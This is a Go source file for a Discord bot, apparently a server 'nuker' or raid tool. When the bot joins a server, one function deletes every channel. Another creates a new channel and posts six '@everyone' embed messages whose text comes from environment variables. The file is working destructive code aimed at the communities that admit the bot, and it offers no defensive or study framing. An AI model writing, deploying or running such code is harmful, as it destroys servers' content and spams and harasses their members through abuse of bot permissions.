package cogs

import (
	"fmt"
	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
	"os"
	"sync"
)

func DeleteChannels(s *discordgo.Session, event *discordgo.GuildCreate) {
	channels, _ := s.GuildChannels(event.ID)

	for _, channel := range channels {
		s.ChannelDelete(channel.ID)
	}
}

func TextSpam(s *discordgo.Session, event *discordgo.GuildCreate, wg *sync.WaitGroup) {
	godotenv.Load()
	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")
	channelName := fmt.Sprintf(CHANNEL_NAME)
	EMBED_DESCRIPTION := os.Getenv("EMBED_DESCRIPTION")
	EMBED_TITLE := os.Getenv("EMBED_TITLE")
	AVATAR_URL := os.Getenv("AVATAR_URL")

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:       EMBED_TITLE,
		Description: EMBED_DESCRIPTION + "\n> **Bot joined at:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n\n",
		Color:       00255,
		Thumbnail:   &thumbnail,
	}

	data := discordgo.MessageSend{
		Content: "@everyone",
		Embeds:  []*discordgo.MessageEmbed{&embed},
	}

	channel, _ := s.GuildChannelCreate(event.ID, channelName, discordgo.ChannelTypeGuildText)

	for i := 0; i < 6; i++ {
		s.ChannelMessageSendComplex(channel.ID, &data)
	}
}
